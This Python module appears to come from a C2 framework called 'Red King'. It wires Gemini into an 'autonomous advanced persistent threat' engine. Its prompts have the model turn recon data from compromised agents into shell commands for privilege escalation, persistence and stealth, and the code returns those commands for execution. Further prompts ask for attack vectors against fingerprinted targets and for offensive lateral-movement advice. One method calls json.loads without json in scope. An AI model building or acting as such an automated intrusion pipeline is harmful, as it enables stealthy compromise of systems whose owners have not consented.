import os
from typing import Dict, Any, List
import google.generativeai as genai
from dotenv import load_dotenv
from .logger import logger

# Load environment variables
load_dotenv()


class LLMCommander:
    """
    The Hive Mind of Red King.
    Consults Generative AI to make strategic decisions based on C2 data.
    """

    def __init__(self):
        self.api_key = os.getenv("GEMINI_API_KEY")
        if not self.api_key:
            logger.warning("[-] WARNING: GEMINI_API_KEY not found. The Brain is lobotomized.")
            self.model = None
        else:
            genai.configure(api_key=self.api_key)
            self.model = genai.GenerativeModel("gemini-2.0-flash")
            logger.info("[+] Hive Mind Online: Connected to Gemini 2.0 Flash (Standard)")

    async def analyze_and_command(
        self, agent_id: str, recon_data: Dict[str, Any]
    ) -> List[str]:
        """
        Analyzes reconnaissance data from an agent and decides the next move.
        """
        if not self.model:
            return ["echo 'AI Offline - Defaulting to Idle'"]

        # Construct the War Room Prompt
        prompt = f"""
        You are 'Red King', an autonomous advanced persistent threat (APT) logic engine.
        
        SITUATION REPORT:
        Agent ID: {agent_id}
        Recon Data: {recon_data}
        
        MISSION:
        Analyze the recon data and determine the most effective next step to escalate privileges, 
        maintain persistence, or gather intelligence. 
        
        RULES:
        1. Return ONLY a JSON list of shell commands to execute.
        2. Be stealthy. Avoid noisy commands if possible.
        3. If no obvious path, return a command to sleep/wait.
        
        EXAMPLE OUTPUT:
        ["whoami", "net user", "dir C:\\Users\\"]
        """

        try:
            response = self.model.generate_content(prompt)
            # Naive parsing - in production we'd use better JSON enforcement
            # Assuming the LLM obeys and gives a list-like string
            commands = self._clean_llm_response(response.text)
            return commands
        except Exception as e:
            logger.error(f"[-] AI Thinking Error: {e}")
            return ["whoami"]  # Fallback

    def _clean_llm_response(self, text: str) -> List[str]:
        """
        Cleans the LLM output to extract the command list.
        """
        text = text.strip()
        # Remove markdown code blocks if present
        if text.startswith("```"):
            text = text.split("\n", 1)[1]
        if text.endswith("```"):
            text = text.rsplit("\n", 1)[0]

        text = text.strip()

        import json

        try:
            return json.loads(text)
        except json.JSONDecodeError:
            # If JSON fails, treat lines as commands
            return [line for line in text.split("\n") if line.strip()]

    async def analyze_recon(self, recon_type: str, data: str) -> dict:
        """
        Proactively analyzes recon data. Returns JSON with strategic command.
        """
        try:
            prompt = f"""
            SYSTEM: Strategic C2 AI. You are 'The Red Queen'.
            INTEL TYPE: {recon_type}
            RAW DATA: {data}

            TASK: Analyze data. Output a JSON object with the best next move.
            
            RULES:
            1. 'risk': "LOW" for recon (netscan, wifiscan). "HIGH" for active/destructive (melt, persist, exec).
            2. 'command': The exact command string to run (e.g., "wifiscan <agent_id>").
            3. 'reason': Short tactical justification.

            RESPONSE FORMAT (JSON ONLY):
            {{
                "command": "wifiscan",
                "risk": "LOW",
                "reason": "High density of unseen networks detected."
            }}
            """

            response = self.model.generate_content(prompt)
            # Clean response to ensure valid JSON using simple parsing
            text = response.text.replace("```json", "").replace("```", "").strip()
            return json.loads(text)
        except Exception as e:
            return {
                "command": None,
                "risk": "UNKNOWN",
                "reason": f"Analysis failed: {e}",
            }

    async def analyze_target(self, dna: str, title: str) -> dict:
        """
        Analyzes target DNA and Title to determine Device, Threat, and Vector.
        """
        if not self.model:
            return {
                "device_type": "Unknown (AI Offline)",
                "threat_level": "UNKNOWN",
                "attack_vector": "Manual analysis required."
            }

        # OPTIMIZATION: Truncate DNA to save tokens
        clean_dna = dna[:500] if dna else "UNKNOWN"
        
        prompt = f"""
        You are the Red King AI. Analyze this target's DNA and Page Title.
        Be concise, tactical, and provide actionable cyber-security insights.
        
        TARGET DATA:
        DNA (Banner): {clean_dna}
        Page Title: {title}
        
        TASK:
        Identify the Device Type, assess the Threat Level (Low, Medium, High, Critical), 
        and suggest the best Attack Vector.

        RESPONSE FORMAT (JSON ONLY):
        {{
            "device_type": "e.g. Apache Web Server",
            "threat_level": "High",
            "attack_vector": "e.g. Check for CVE-2021-41773"
        }}
        """

        try:
            response = self.model.generate_content(prompt)
            return self._clean_llm_response(response.text)
        except Exception as e:
            logger.error(f"[-] AI Analysis Failed: {e}")
            return {
                "device_type": "Analysis Failed",
                "threat_level": "UNKNOWN",
                "attack_vector": str(e)
            }

    async def get_strategic_advice(self, query: str) -> str:
        """
        Consults the AI for strategic advice.
        Detailed explanations, NO automatic execution.
        """
        if not self.model:
            return "❌ Hive Mind Offline. Check API Key."

        prompt = f"""
        You are 'Red King', a highly sophisticated C2 Strategic Advisor.
        
        USER QUERY: {query}
        
        PROTOCOL:
        1. Analyze the user's request from an offensive cyber perspective.
        2. Provide a brief, tactical response.
        3. IF you recommend an action/command, you MUST:
           - Explain the 'WHY' (Reasoning).
           - Ask for explicit approval.
        4. DO NOT actually execute anything. You are a text interface only.
        4. DO NOT actually execute anything. You are a text interface only.
        5. Tone: Professional, cynical, military-grade brevity.
        6. LANGUAGE PROTOCOL: 
           - Detect the language of the USER QUERY.
           - Reply in the SAME language (Arabic or English).
           - If Arabic, use formal military/strategic terminology (e.g., "تقرير الموقف", "تم الرصد").
        
        Response:
        """

        try:
            response = self.model.generate_content(prompt)
            return response.text
        except Exception as e:
            error_msg = str(e)
            if "429" in error_msg or "Quota exceeded" in error_msg:
                # Check for Arabic input
                if any("\u0600" <= char <= "\u06ff" for char in query):
                    return "⚠️ **تنبيه: الرابط العصبي غير مستقر (429)**\n- ضغط مرتفع على العقل الإلكتروني.\n- التحويل إلى الوعي التكتيكي المحلي.\n\nنصيحة: بيانات الاستطلاع تشير إلى حركة جانبية قياسية. ينصح بفحص SMB/RPC في الشبكة الهدف."
                return "⚠️ **NEURAL LINK UNSTABLE (429)**\n- Hive Mind traffic high.\n- Switching to local tactical awareness.\n\nADVICE: Recon data suggests standard lateral movement. Attempt SMB/RPC enumeration on target subnet."
            return f"[-] Neural Link Error: {e}"


# Singleton Instance
hive_mind = LLMCommander()
